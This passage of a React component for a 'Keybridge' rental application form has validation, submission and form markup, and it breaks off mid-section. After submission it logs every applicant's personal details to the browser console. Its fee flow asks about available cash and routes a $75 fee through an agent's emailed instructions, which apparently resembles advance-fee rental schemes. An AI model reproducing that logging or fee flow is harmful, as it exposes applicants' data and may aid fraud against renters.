"use client";

import React, { useState, useEffect } from "react";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import {
  CreditCard,
  Banknote,
  ShieldCheck,
  AlertCircle,
  ChevronDown,
  ArrowRight,
  Lock,
  Sparkles,
  CheckCircle2,
  Loader2,
  RotateCcw,
} from "lucide-react";

export interface ApplicationFormData {
  // SECTION 0: Application Details
  agentCode: string;
  propertyType: string;
  otherPropertyType: string;

  // SECTION 1: Applicant Information
  firstName: string;
  lastName: string;
  email: string;
  phone: string;
  maritalStatus: string;

  // SECTION 2: Current Address
  currentStreetAddress: string;
  currentUnit: string;
  currentCity: string;
  currentState: string;
  currentZipCode: string;

  // SECTION 3: Property / Location Information
  desiredZipCode: string;
  preferredMoveInDate: string;
  amountAvailableForMoveIn: string;

  // SECTION 4: Applicant Details
  ownsCar: string;
  hasPet: string;
  hasBeenEvicted: string;
  plannedStayDuration: string;
  payAdvanceMonths: string;

  // SECTION 5: Application Fee
  hasFeeAvailable: string;
  preferredPaymentMethod: string;

  // SECTION 6: Declaration
  declarationConfirmed: boolean;
}

export const US_STATES = [
  { code: "AL", name: "Alabama" },
  { code: "AK", name: "Alaska" },
  { code: "AZ", name: "Arizona" },
  { code: "AR", name: "Arkansas" },
  { code: "CA", name: "California" },
  { code: "CO", name: "Colorado" },
  { code: "CT", name: "Connecticut" },
  { code: "DE", name: "Delaware" },
  { code: "DC", name: "District of Columbia" },
  { code: "FL", name: "Florida" },
  { code: "GA", name: "Georgia" },
  { code: "HI", name: "Hawaii" },
  { code: "ID", name: "Idaho" },
  { code: "IL", name: "Illinois" },
  { code: "IN", name: "Indiana" },
  { code: "IA", name: "Iowa" },
  { code: "KS", name: "Kansas" },
  { code: "KY", name: "Kentucky" },
  { code: "LA", name: "Louisiana" },
  { code: "ME", name: "Maine" },
  { code: "MD", name: "Maryland" },
  { code: "MA", name: "Massachusetts" },
  { code: "MI", name: "Michigan" },
  { code: "MN", name: "Minnesota" },
  { code: "MS", name: "Mississippi" },
  { code: "MO", name: "Missouri" },
  { code: "MT", name: "Montana" },
  { code: "NE", name: "Nebraska" },
  { code: "NV", name: "Nevada" },
  { code: "NH", name: "New Hampshire" },
  { code: "NJ", name: "New Jersey" },
  { code: "NM", name: "New Mexico" },
  { code: "NY", name: "New York" },
  { code: "NC", name: "North Carolina" },
  { code: "ND", name: "North Dakota" },
  { code: "OH", name: "Ohio" },
  { code: "OK", name: "Oklahoma" },
  { code: "OR", name: "Oregon" },
  { code: "PA", name: "Pennsylvania" },
  { code: "RI", name: "Rhode Island" },
  { code: "SC", name: "South Carolina" },
  { code: "SD", name: "South Dakota" },
  { code: "TN", name: "Tennessee" },
  { code: "TX", name: "Texas" },
  { code: "UT", name: "Utah" },
  { code: "VT", name: "Vermont" },
  { code: "VA", name: "Virginia" },
  { code: "WA", name: "Washington" },
  { code: "WV", name: "West Virginia" },
  { code: "WI", name: "Wisconsin" },
  { code: "WY", name: "Wyoming" },
];

const initialFormData: ApplicationFormData = {
  agentCode: "",
  propertyType: "",
  otherPropertyType: "",
  firstName: "",
  lastName: "",
  email: "",
  phone: "",
  maritalStatus: "",
  currentStreetAddress: "",
  currentUnit: "",
  currentCity: "",
  currentState: "",
  currentZipCode: "",
  desiredZipCode: "",
  preferredMoveInDate: "",
  amountAvailableForMoveIn: "",
  ownsCar: "",
  hasPet: "",
  hasBeenEvicted: "",
  plannedStayDuration: "",
  payAdvanceMonths: "",
  hasFeeAvailable: "",
  preferredPaymentMethod: "",
  declarationConfirmed: false,
};

export function ApplicationIntro() {
  const [formData, setFormData] = useState<ApplicationFormData>(initialFormData);
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [isSubmitting, setIsSubmitting] = useState<boolean>(false);
  const [isSubmitted, setIsSubmitted] = useState<boolean>(false);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [referenceId, setReferenceId] = useState<string>("");
  const [selectedService, setSelectedService] = useState<"long-term" | "shortlet" | null>(null);

  useEffect(() => {
    const parseServiceFromUrl = () => {
      if (typeof window !== "undefined") {
        const hash = window.location.hash || "";
        const search = window.location.search || "";
        if (hash.includes("service=long-term") || search.includes("service=long-term")) {
          setSelectedService("long-term");
        } else if (hash.includes("service=shortlet") || search.includes("service=shortlet")) {
          setSelectedService("shortlet");
        }
      }
    };

    const handleCustomEvent = (e: Event) => {
      const ce = e as CustomEvent<{ service?: "long-term" | "shortlet" }>;
      if (ce.detail?.service) {
        setSelectedService(ce.detail.service);
      }
    };

    parseServiceFromUrl();
    window.addEventListener("hashchange", parseServiceFromUrl);
    window.addEventListener("keybridge:service-select", handleCustomEvent);

    return () => {
      window.removeEventListener("hashchange", parseServiceFromUrl);
      window.removeEventListener("keybridge:service-select", handleCustomEvent);
    };
  }, []);

  const getTodayDateString = () => {
    const today = new Date();
    const yyyy = today.getFullYear();
    const mm = String(today.getMonth() + 1).padStart(2, "0");
    const dd = String(today.getDate()).padStart(2, "0");
    return `${yyyy}-${mm}-${dd}`;
  };

  const getInputClasses = (hasError: boolean) =>
    `w-full bg-sand-50/60 hover:bg-white focus:bg-white border rounded-xl px-4 py-3.5 text-base sm:text-sm text-charcoal-900 focus:outline-none transition-all font-sans placeholder:text-taupe-400 ${
      hasError
        ? "border-rose-400 bg-rose-50/20 focus:border-rose-600 focus:ring-2 focus:ring-rose-500/20 text-rose-950"
        : "border-sand-300 focus:border-bronze-600 focus:ring-2 focus:ring-bronze-500/20"
    }`;

  const getSelectClasses = (hasError: boolean) =>
    `w-full appearance-none bg-sand-50/60 hover:bg-white focus:bg-white border rounded-xl px-4 py-3.5 pr-10 text-base sm:text-sm text-charcoal-900 focus:outline-none transition-all font-sans cursor-pointer ${
      hasError
        ? "border-rose-400 bg-rose-50/20 focus:border-rose-600 focus:ring-2 focus:ring-rose-500/20 text-rose-950"
        : "border-sand-300 focus:border-bronze-600 focus:ring-2 focus:ring-bronze-500/20"
    }`;

  const getToggleButtonClasses = (isSelected: boolean, hasError: boolean) =>
    `flex items-center justify-center py-3.5 px-4 rounded-xl border text-sm font-sans font-medium transition-all cursor-pointer select-none ${
      isSelected
        ? "bg-bronze-700 text-white border-bronze-700 shadow-sm"
        : hasError
        ? "bg-rose-50/40 hover:bg-rose-50/70 text-rose-900 border-rose-300"
        : "bg-sand-50/60 hover:bg-white text-charcoal-800 border-sand-300"
    }`;

  const renderFieldError = (fieldName: string) => {
    if (!errors[fieldName]) return null;
    return (
      <p
        id={`${fieldName}-error`}
        role="alert"
        aria-live="polite"
        className="text-xs text-rose-600 flex items-center gap-1.5 mt-1.5 font-sans animate-fadeIn"
      >
        <AlertCircle className="w-3.5 h-3.5 flex-shrink-0 text-rose-500" />
        <span>{errors[fieldName]}</span>
      </p>
    );
  };

  const handleInputChange = (
    e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>
  ) => {
    const { name, value } = e.target;
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }));
    if (errors[name]) {
      setErrors((prev) => {
        const next = { ...prev };
        delete next[name];
        return next;
      });
    }
    if (errorMessage) {
      setErrorMessage(null);
    }
  };

  const validateForm = (): Record<string, string> => {
    const newErrors: Record<string, string> = {};
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const zipRegex = /^\d{5}$/;
    const todayStr = getTodayDateString();

    // SECTION 0: Application Details
    if (!formData.agentCode) {
      newErrors.agentCode = "Please select your assigned agent.";
    }
    if (!formData.propertyType) {
      newErrors.propertyType = "Please select a prospective property type.";
    }

    // SECTION 1: Applicant Information
    if (!formData.firstName.trim()) {
      newErrors.firstName = "First name is required.";
    }
    if (!formData.lastName.trim()) {
      newErrors.lastName = "Last name is required.";
    }
    if (!formData.email.trim()) {
      newErrors.email = "Email address is required.";
    } else if (!emailRegex.test(formData.email.trim())) {
      newErrors.email = "Please enter a valid email address (e.g. name@example.com).";
    }

    const phoneDigits = formData.phone.replace(/\D/g, "");
    if (!formData.phone.trim()) {
      newErrors.phone = "Phone number is required.";
    } else if (
      !(phoneDigits.length === 10 || (phoneDigits.length === 11 && phoneDigits.startsWith("1")))
    ) {
      newErrors.phone = "Please enter a valid 10-digit US phone number (e.g. (555) 000-0000).";
    }

    if (!formData.maritalStatus) {
      newErrors.maritalStatus = "Please select your marital status.";
    }

    // SECTION 2: Current Address
    if (!formData.currentStreetAddress.trim()) {
      newErrors.currentStreetAddress = "Street address is required.";
    }
    if (!formData.currentCity.trim()) {
      newErrors.currentCity = "City is required.";
    }
    if (!formData.currentState) {
      newErrors.currentState = "Please select your current state.";
    }
    if (!formData.currentZipCode.trim()) {
      newErrors.currentZipCode = "Current ZIP code is required.";
    } else if (!zipRegex.test(formData.currentZipCode.trim())) {
      newErrors.currentZipCode = "Current ZIP code must be a 5-digit US ZIP code (e.g. 90210).";
    }

    // SECTION 3: Property / Location Information
    if (!formData.desiredZipCode.trim()) {
      newErrors.desiredZipCode = "Desired ZIP code is required.";
    } else if (!zipRegex.test(formData.desiredZipCode.trim())) {
      newErrors.desiredZipCode = "Desired ZIP code must be a 5-digit US ZIP code (e.g. 90210).";
    }

    if (!formData.preferredMoveInDate) {
      newErrors.preferredMoveInDate = "Preferred move-in date is required.";
    } else if (formData.preferredMoveInDate < todayStr) {
      newErrors.preferredMoveInDate = "Preferred move-in date cannot be in the past.";
    }

    if (!formData.amountAvailableForMoveIn.trim()) {
      newErrors.amountAvailableForMoveIn = "Amount available for move-in is required.";
    }

    // SECTION 4: Applicant Details
    if (!formData.ownsCar) {
      newErrors.ownsCar = "Please indicate whether you own a car.";
    }
    if (!formData.hasPet) {
      newErrors.hasPet = "Please indicate whether you have a pet.";
    }
    if (!formData.hasBeenEvicted) {
      newErrors.hasBeenEvicted = "Please indicate whether you have ever been evicted.";
    }
    if (!formData.plannedStayDuration) {
      newErrors.plannedStayDuration = "Please select your planned duration of stay.";
    }
    if (!formData.payAdvanceMonths) {
      newErrors.payAdvanceMonths = "Please indicate whether you plan to pay advance rent.";
    }

    // SECTION 5: Application Fee
    if (!formData.hasFeeAvailable) {
      newErrors.hasFeeAvailable = "Please indicate if you currently have the $75 application fee available.";
    }
    if (!formData.preferredPaymentMethod) {
      newErrors.preferredPaymentMethod = "Please select your preferred payment method.";
    }

    // SECTION 6: Declaration
    if (!formData.declarationConfirmed) {
      newErrors.declarationConfirmed = "You must confirm that the information provided is accurate.";
    }

    return newErrors;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (isSubmitting) return;

    const validationErrors = validateForm();
    if (Object.keys(validationErrors).length > 0) {
      setErrors(validationErrors);
      const count = Object.keys(validationErrors).length;
      setErrorMessage(
        `Please correct the ${count} required field${count > 1 ? "s" : ""} highlighted in red above before submitting.`
      );

      // Scroll smoothly to the first field with an error and focus it
      const firstFieldKey = Object.keys(validationErrors)[0];
      if (typeof window !== "undefined") {
        const el =
          document.getElementById(firstFieldKey) ||
          document.getElementById(`${firstFieldKey}-group`) ||
          document.querySelector(`[name="${firstFieldKey}"]`);
        if (el) {
          el.scrollIntoView({ behavior: "smooth", block: "center" });
          if ("focus" in el && typeof (el as HTMLElement).focus === "function") {
            (el as HTMLElement).focus();
          }
        }
      }
      return;
    }

    setErrors({});
    setErrorMessage(null);
    setIsSubmitting(true);

    try {
      const response = await fetch("/api/apply", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(formData),
      });

      const result = await response.json();

      if (!response.ok || !result.success) {
        if (result.errors && typeof result.errors === "object") {
          setErrors(result.errors);
          const count = Object.keys(result.errors).length;
          setErrorMessage(
            result.message ||
              `The server identified ${count} issue${count > 1 ? "s" : ""} with your application. Please review the highlighted fields above.`
          );

          // Scroll smoothly to first server-reported error
          const firstErrKey = Object.keys(result.errors)[0];
          if (typeof window !== "undefined") {
            const el =
              document.getElementById(firstErrKey) ||
              document.getElementById(`${firstErrKey}-group`) ||
              document.querySelector(`[name="${firstErrKey}"]`);
            if (el) {
              el.scrollIntoView({ behavior: "smooth", block: "center" });
              if ("focus" in el && typeof (el as HTMLElement).focus === "function") {
                (el as HTMLElement).focus();
              }
            }
          }
        } else {
          setErrorMessage(
            result.message || "Failed to submit your application. Please try again."
          );
        }
        return;
      }

      const returnedRef = result.referenceId;
      setReferenceId(returnedRef);
      setIsSubmitted(true);

      // Mandated by user: log full form payload to console
      console.log("Official Keybridge Application Payload:", {
        referenceId: returnedRef,
        submittedAt: new Date().toISOString(),
        ...formData,
      });
    } catch (err) {
      console.error("Application submission network error:", err);
      setErrorMessage(
        "A network communication error occurred while processing your application. Please check your connection and try again."
      );
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <section
      id="application"
      className="py-12 md:py-16 bg-sand-50/60 border-b border-sand-300/80 relative overflow-hidden"
    >
      <div className="max-w-5xl mx-auto px-4 sm:px-6 relative space-y-8">
        {/* Section Header */}
        <div className="max-w-3xl space-y-3">
          <div className="flex items-center gap-2">
            <Badge variant="bronze">Rental Application</Badge>
            <span className="text-xs font-sans tracking-architectural uppercase text-taupe-500 font-medium">
              Direct Filing
            </span>
          </div>

          <h2 className="font-headline text-2xl sm:text-3xl lg:text-4xl font-semibold tracking-tight text-charcoal-900 leading-tight">
            Submit Your Application
          </h2>

          <p className="font-sans text-sm sm:text-base text-taupe-600 leading-relaxed">
            Complete the form below to begin review with your assigned agent after selecting your preferred apartment. The $75 application fee is required after submission to start underwriting.
          </p>
        </div>

        {/* Compact Two-Step Summary */}
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
          <div className="p-3.5 rounded-xl bg-white border border-sand-300 shadow-subtle flex items-center gap-3">
            <div className="w-8 h-8 rounded-lg bg-bronze-50 border border-bronze-200 flex items-center justify-center text-bronze-700 flex-shrink-0">
              <CreditCard className="w-4 h-4" />
            </div>
            <div>
              <span className="block text-xs font-semibold text-charcoal-900">Step 1: Application + $75 Fee</span>
              <span className="block text-[11px] text-taupe-500">Starts file processing and application review.</span>
            </div>
          </div>

          <div className="p-3.5 rounded-xl bg-white border border-sand-300 shadow-subtle flex items-center gap-3">
            <div className="w-8 h-8 rounded-lg bg-olive-50 border border-olive-200 flex items-center justify-center text-olive-700 flex-shrink-0">
              <Banknote className="w-4 h-4" />
            </div>
            <div>
              <span className="block text-xs font-semibold text-charcoal-900">Step 2: Approved Rent Payment</span>
              <span className="block text-[11px] text-taupe-500">Paid after approval to issue your lease and keys.</span>
            </div>
          </div>
        </div>

        {/* Multi-Section Apartment Application Form Container */}
        <div className="bg-white border border-sand-300 rounded-3xl p-6 sm:p-10 md:p-12 shadow-card space-y-12">
          {isSubmitted ? (
            /* SUCCESS CONFIRMATION STATE VIEW */
            <div className="space-y-8 animate-fadeIn">
              {/* Success Status Header */}
              <div className="p-8 sm:p-10 rounded-3xl bg-olive-50/80 border border-olive-200 text-center space-y-4">
                <div className="w-16 h-16 rounded-full bg-olive-100 border border-olive-300 text-olive-800 flex items-center justify-center mx-auto shadow-subtle">
                  <CheckCircle2 className="w-8 h-8" />
                </div>

                <div className="space-y-2 max-w-xl mx-auto">
                  <div className="inline-flex items-center gap-2 text-xs font-mono uppercase tracking-widest text-olive-800 font-semibold bg-olive-100/90 px-3.5 py-1 rounded-full">
                    Placement Filing Received
                  </div>
                  <h3 className="font-headline text-3xl sm:text-4xl font-medium text-charcoal-900">
                    Application Received
                  </h3>
                  <p className="font-sans text-base sm:text-lg text-taupe-700 leading-relaxed">
                    Your Keybridge apartment application has been submitted successfully.
                  </p>
                </div>

                <div className="pt-2 flex flex-wrap items-center justify-center gap-3 text-xs font-mono text-taupe-600">
                  <span className="bg-white/90 border border-sand-300 px-3.5 py-1.5 rounded-lg shadow-subtle">
                    Reference: <strong className="text-charcoal-900">{referenceId}</strong>
                  </span>
                  <span className="bg-white/90 border border-sand-300 px-3.5 py-1.5 rounded-lg shadow-subtle">
                    Assigned Agent: <strong className="text-charcoal-900">{formData.agentCode}</strong>
                  </span>
                  <span className="bg-white/90 border border-sand-300 px-3.5 py-1.5 rounded-lg shadow-subtle">
                    Target Unit: <strong className="text-charcoal-900">{formData.propertyType}</strong>
                  </span>
                </div>
              </div>

              {/* NEXT STEP — APPLICATION FEE MANDATORY CALLOUT */}
              <div className="p-6 sm:p-8 rounded-3xl bg-amber-50/85 border border-amber-200/90 space-y-5">
                <div className="flex items-start gap-4">
                  <div className="w-12 h-12 rounded-2xl bg-amber-100 border border-amber-300 text-amber-900 flex items-center justify-center flex-shrink-0 mt-0.5">
                    <CreditCard className="w-6 h-6" />
                  </div>
                  <div className="space-y-1.5">
                    <div className="flex items-center gap-2">
                      <span className="text-xs font-mono uppercase tracking-wider text-amber-800 font-bold">
                        Next Step Sequence
                      </span>
                      <span className="text-xs font-mono bg-amber-200/80 text-amber-900 px-2.5 py-0.5 rounded font-semibold">
                        Fee: $75.00 USD
                      </span>
                    </div>
                    <h4 className="font-headline text-xl sm:text-2xl font-semibold text-charcoal-900">
                      Next Step: Application Fee
                    </h4>
                    <p className="font-sans text-sm sm:text-base text-charcoal-800 leading-relaxed">
                      The required $75 application fee must be completed before your application can be reviewed and processed.
                    </p>
                  </div>
                </div>

                {/* Details Breakdown */}
                <div className="pt-4 border-t border-amber-200/80 grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs font-sans">
                  <div className="bg-white/90 p-4 rounded-xl border border-amber-200/70 space-y-1">
                    <span className="text-[11px] font-mono uppercase text-taupe-500 font-medium">Selected Payment Channel</span>
                    <p className="font-headline font-semibold text-sm text-charcoal-900">{formData.preferredPaymentMethod || "Direct Agent Settlement"}</p>
                    <p className="text-[11px] text-taupe-500 leading-snug">Your assigned Keybridge representative ({formData.agentCode}) will send official payment instructions directly to <strong className="text-charcoal-800">{formData.email}</strong>.</p>
                  </div>
                  <div className="bg-white/90 p-4 rounded-xl border border-amber-200/70 space-y-1">
                    <span className="text-[11px] font-mono uppercase text-taupe-500 font-medium">Subsequent Process</span>
                    <p className="font-headline font-semibold text-sm text-charcoal-900">Phase 2: Post-Approval Rent</p>
                    <p className="text-[11px] text-taupe-500 leading-snug">Following file approval notice, rent payment is remitted directly prior to lease signing and apartment key collection.</p>
                  </div>
                </div>
              </div>

              {/* Reset / Submit Another Action */}
              <div className="pt-4 flex flex-col sm:flex-row items-center justify-between gap-4 border-t border-sand-200">
                <div className="flex items-center gap-2 text-xs text-taupe-500 font-mono">
                  <ShieldCheck className="w-4 h-4 text-bronze-600 flex-shrink-0" />
                  <span>Official Keybridge Placement Record Encrypted & Logged</span>
                </div>

                <Button
                  type="button"
                  variant="secondary"
                  onClick={() => {
                    setIsSubmitted(false);
                    setFormData(initialFormData);
                    setErrors({});
                    setErrorMessage(null);
                    setSelectedService(null);
                  }}
                  className="w-full sm:w-auto gap-2 text-xs"
                >
                  <RotateCcw className="w-3.5 h-3.5" />
                  <span>Submit Another Application</span>
                </Button>
              </div>
            </div>
          ) : (
            <>
              {/* Form Top Title & Context */}
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-6 border-b border-sand-200">
                <div className="space-y-1">
                  <h3 className="font-headline text-2xl sm:text-3xl font-medium text-charcoal-900">
                    Official Tenancy Application Form
                  </h3>
                  <p className="text-xs sm:text-sm font-sans text-taupe-600">
                    Please provide accurate information associated with your prospective rental.
                  </p>
                </div>

                <div className="flex items-center gap-2 text-xs font-mono text-taupe-500 bg-sand-50 border border-sand-200 px-3.5 py-2 rounded-full flex-shrink-0">
                  <Lock className="w-3.5 h-3.5 text-bronze-600" />
                  <span>Multi-Section Filing</span>
                </div>
              </div>

              <form onSubmit={handleSubmit} noValidate className="space-y-12">
                {/* Pre-Selected Service Pathway Notification */}
                {selectedService && (
                  <div className="p-4 rounded-2xl bg-bronze-50/90 border border-bronze-200/90 flex items-center justify-between gap-4 animate-smooth-fade shadow-subtle">
                    <div className="flex items-center gap-3">
                      <div className="w-8 h-8 rounded-xl bg-bronze-100 border border-bronze-200 flex items-center justify-center text-bronze-700 flex-shrink-0">
                        <Sparkles className="w-4 h-4" />
                      </div>
                      <div>
                        <div className="text-[10px] font-mono uppercase tracking-wider text-bronze-700 font-semibold flex items-center gap-1.5">
                          <span className="w-1.5 h-1.5 rounded-full bg-bronze-600" />
                          Selected Service Pathway
                        </div>
                        <div className="text-sm font-sans font-medium text-charcoal-900">
                          {selectedService === "long-term"
                            ? "Long-Term Placement (1 to 3 Years Primary Residence)"
                            : "Shortlet / Flexible Accommodation (30 Days to 11 Months)"}
                        </div>
                      </div>
                    </div>
                    <button
                      type="button"
                      onClick={() => setSelectedService(null)}
                      className="text-xs font-mono text-taupe-500 hover:text-charcoal-900 underline px-2 py-1 flex-shrink-0"
                    >
                      Clear
                    </button>
                  </div>
                )}

            {/* SECTION 0 — Application Details */}
            <div className="space-y-6">
              {/* Section 0 Header */}
              <div className="flex items-start gap-3 pb-4 border-b border-sand-200">
                <span className="w-8 h-8 rounded-xl bg-bronze-50 border border-bronze-200 text-bronze-700 font-mono text-xs font-bold flex items-center justify-center flex-shrink-0 mt-0.5">
                  00
                </span>
                <div className="space-y-0.5">
                  <h4 className="font-headline text-lg sm:text-xl font-medium text-charcoal-900">
                    Application Details
                  </h4>
                  <p className="text-xs font-sans text-taupe-500">
                    Select your assigned agent and desired property type.
                  </p>
                </div>
              </div>

              {/* Section 0 Fields */}
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
                {/* Select Your Assigned Agent */}
                <div className="space-y-2">
                  <label
                    htmlFor="agentCode"
                    className="block text-xs font-mono uppercase tracking-wider text-charcoal-800 font-medium"
                  >
                    Select Your Assigned Agent <span className="text-bronze-600">*</span>
                  </label>
                  <div className="relative">
                    <select
                      id="agentCode"
                      name="agentCode"
                      value={formData.agentCode}
                      onChange={handleInputChange}
                      aria-invalid={Boolean(errors.agentCode)}
                      aria-describedby={errors.agentCode ? "agentCode-error" : undefined}
                      className={getSelectClasses(Boolean(errors.agentCode))}
                    >
                      <option value="" disabled>
                        Select agent code...
                      </option>
                      <option value="Agent 01">Agent 01</option>
                      <option value="Agent 02">Agent 02</option>
                      <option value="Agent 03">Agent 03</option>
                    </select>
                    <ChevronDown className="w-4 h-4 text-taupe-400 absolute right-3.5 top-1/2 -translate-y-1/2 pointer-events-none" />
                  </div>
                  {renderFieldError("agentCode")}
                  <p className="text-[11px] font-sans text-taupe-500 leading-snug">
                    Select the agent code provided to you by your Keybridge representative.
                  </p>
                </div>

                {/* Property Type */}
                <div className="space-y-2">
                  <label
                    htmlFor="propertyType"
                    className="block text-xs font-mono uppercase tracking-wider text-charcoal-800 font-medium"
                  >
                    Property Type <span className="text-bronze-600">*</span>
                  </label>
                  <div className="relative">
                    <select
                      id="propertyType"
                      name="propertyType"
                      value={formData.propertyType}
                      onChange={handleInputChange}
                      aria-invalid={Boolean(errors.propertyType)}
                      aria-describedby={errors.propertyType ? "propertyType-error" : undefined}
                      className={getSelectClasses(Boolean(errors.propertyType))}
                    >
                      <option value="" disabled>
                        Select property type...
                      </option>
                      <option value="Apartment">Apartment</option>
                      <option value="Studio">Studio</option>
                      <option value="Condo">Condo</option>
                      <option value="Townhouse">Townhouse</option>
                      <option value="Single-Family Home">Single-Family Home</option>
                      <option value="Duplex">Duplex</option>
                      <option value="Other">Other</option>
                    </select>
                    <ChevronDown className="w-4 h-4 text-taupe-400 absolute right-3.5 top-1/2 -translate-y-1/2 pointer-events-none" />
                  </div>
                  {renderFieldError("propertyType")}
                  <p className="text-[11px] font-sans text-taupe-500 leading-snug">
                    The type of property you are applying for.
                  </p>
                </div>

                {/* Conditional "Other" Property Type input */}
                {formData.propertyType === "Other" && (
                  <div className="sm:col-span-2 space-y-2 animate-fadeIn">
                    <label
                      htmlFor="otherPropertyType"
                      className="block text-xs font-mono uppercase tracking-wider text-charcoal-800 font-medium"
                    >
                      Specify Property Type <span className="text-taupe-400 font-normal">(Optional)</span>
                    </label>
                    <input
                      type="text"
                      id="otherPropertyType"
                      name="otherPropertyType"
                      value={formData.otherPropertyType}
                      onChange={handleInputChange}
                      placeholder="e.g. Loft, Penthouse, Triplex, Carriage House"
                      className={getInputClasses(false)}
                    />
                    <p className="text-[11px] font-sans text-taupe-500">
                      Provide additional architectural details for your prospective unit.
                    </p>
                  </div>
                )}
              </div>
            </div>

            {/* SECTION 1 — Applicant Information */}
            <div className="space-y-6 pt-4">
              {/* Section 1 Header */}
              <div className="flex items-start gap-3 pb-4 border-b border-sand-200">
                <span className="w-8 h-8 rounded-xl bg-bronze-50 border border-bronze-200 text-bronze-700 font-mono text-xs font-bold flex items-center justify-center flex-shrink-0 mt-0.5">
                  01
                </span>
                <div className="space-y-0.5">
                  <h4 className="font-headline text-lg sm:text-xl font-medium text-charcoal-900">
                    Applicant Information
                  </h4>
                  <p className="text-xs font-sans text-taupe-500">
                    Primary prospective tenant identification and official contact credentials.
                  </p>
                </div>
              </div>

              {/* Section 1 Fields */}
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
                {/* First Name */}
                <div className="space-y-2">
                  <label
                    htmlFor="firstName"
                    className="block text-xs font-mono uppercase tracking-wider text-charcoal-800 font-medium"
                  >
                    First Name <span className="text-bronze-600">*</span>
                  </label>
                  <input
                    type="text"
                    id="firstName"
                    name="firstName"
                    value={formData.firstName}
                    onChange={handleInputChange}
                    placeholder="Enter first name"
                    aria-invalid={Boolean(errors.firstName)}
                    aria-describedby={errors.firstName ? "firstName-error" : undefined}
                    className={getInputClasses(Boolean(errors.firstName))}
                  />
                  {renderFieldError("firstName")}
                </div>

                {/* Last Name */}
                <div className="space-y-2">
                  <label
                    htmlFor="lastName"
                    className="block text-xs font-mono uppercase tracking-wider text-charcoal-800 font-medium"
                  >
                    Last Name <span className="text-bronze-600">*</span>
                  </label>
                  <input
                    type="text"
                    id="lastName"
                    name="lastName"
                    value={formData.lastName}
                    onChange={handleInputChange}
                    placeholder="Enter last name"
                    aria-invalid={Boolean(errors.lastName)}
                    aria-describedby={errors.lastName ? "lastName-error" : undefined}
                    className={getInputClasses(Boolean(errors.lastName))}
                  />
                  {renderFieldError("lastName")}
                </div>

                {/* Email Address */}
                <div className="space-y-2">
                  <label
                    htmlFor="email"
                    className="block text-xs font-mono uppercase tracking-wider text-charcoal-800 font-medium"
                  >
                    Email Address <span className="text-bronze-600">*</span>
                  </label>
                  <input
                    type="email"
                    id="email"
                    name="email"
                    value={formData.email}
                    onChange={handleInputChange}
                    placeholder="e.g. name@example.com"
                    aria-invalid={Boolean(errors.email)}
                    aria-describedby={errors.email ? "email-error" : undefined}
                    className={getInputClasses(Boolean(errors.email))}
                  />
                  {renderFieldError("email")}
                  <p className="text-[11px] font-sans text-taupe-500">
                    Your official application decision will be sent to this address.
                  </p>
                </div>

                {/* Phone Number */}
                <div className="space-y-2">
                  <label
                    htmlFor="phone"
                    className="block text-xs font-mono uppercase tracking-wider text-charcoal-800 font-medium"
                  >
                    Phone Number <span className="text-bronze-600">*</span>
                  </label>
                  <input
                    type="tel"
                    id="phone"
                    name="phone"
                    value={formData.phone}
                    onChange={handleInputChange}
                    placeholder="e.g. (555) 000-0000"
                    aria-invalid={Boolean(errors.phone)}
                    aria-describedby={errors.phone ? "phone-error" : undefined}
                    className={getInputClasses(Boolean(errors.phone))}
                  />
                  {renderFieldError("phone")}
                  <p className="text-[11px] font-sans text-taupe-500">
                    For direct agent consultation and key collection coordination.
                  </p>
                </div>

                {/* Marital Status */}
                <div className="space-y-2">
                  <label
                    htmlFor="maritalStatus"
                    className="block text-xs font-mono uppercase tracking-wider text-charcoal-800 font-medium"
                  >
                    Marital Status <span className="text-bronze-600">*</span>
                  </label>
                  <div className="relative">
                    <select
                      id="maritalStatus"
                      name="maritalStatus"
                      value={formData.maritalStatus}
                      onChange={handleInputChange}
                      aria-invalid={Boolean(errors.maritalStatus)}
                      aria-describedby={errors.maritalStatus ? "maritalStatus-error" : undefined}
                      className={getSelectClasses(Boolean(errors.maritalStatus))}
                    >
                      <option value="" disabled>
                        Select status...
                      </option>
                      <option value="Single">Single</option>
                      <option value="Married">Married</option>
                    </select>
                    <ChevronDown className="w-4 h-4 text-taupe-400 absolute right-3.5 top-1/2 -translate-y-1/2 pointer-events-none" />
                  </div>
                  {renderFieldError("maritalStatus")}
                </div>
              </div>
            </div>

            {/* SECTION 2 — Current Address */}
            <div className="space-y-6 pt-4">
              {/* Section 2 Header */}
              <div className="flex items-start gap-3 pb-4 border-b border-sand-200">
                <span className="w-8 h-8 rounded-xl bg-bronze-50 border border-bronze-200 text-bronze-700 font-mono text-xs font-bold flex items-center justify-center flex-shrink-0 mt-0.5">
                  02
                </span>
                <div className="space-y-0.5">
                  <h4 className="font-headline text-lg sm:text-xl font-medium text-charcoal-900">
                    Current Address
                  </h4>
                  <p className="text-xs font-sans text-taupe-500">
                    Your active residential domicile and postal jurisdiction.
                  </p>
                </div>
              </div>

              {/* Section 2 Fields */}
              <div className="grid grid-cols-1 sm:grid-cols-3 gap-6">
                {/* Street Address */}
                <div className="sm:col-span-2 space-y-2">
                  <label
                    htmlFor="currentStreetAddress"
                    className="block text-xs font-mono uppercase tracking-wider text-charcoal-800 font-medium"
                  >
                    Street Address <span className="text-bronze-600">*</span>
                  </label>
                  <input
                    type="text"
                    id="currentStreetAddress"
                    name="currentStreetAddress"
                    value={formData.currentStreetAddress}
                    onChange={handleInputChange}
                    placeholder="e.g. 742 Evergreen Terrace"
                    aria-invalid={Boolean(errors.currentStreetAddress)}
                    aria-describedby={errors.currentStreetAddress ? "currentStreetAddress-error" : undefined}
                    className={getInputClasses(Boolean(errors.currentStreetAddress))}
                  />
                  {renderFieldError("currentStreetAddress")}
                </div>

                {/* Apartment/Unit (optional) */}
                <div className="space-y-2">
                  <label
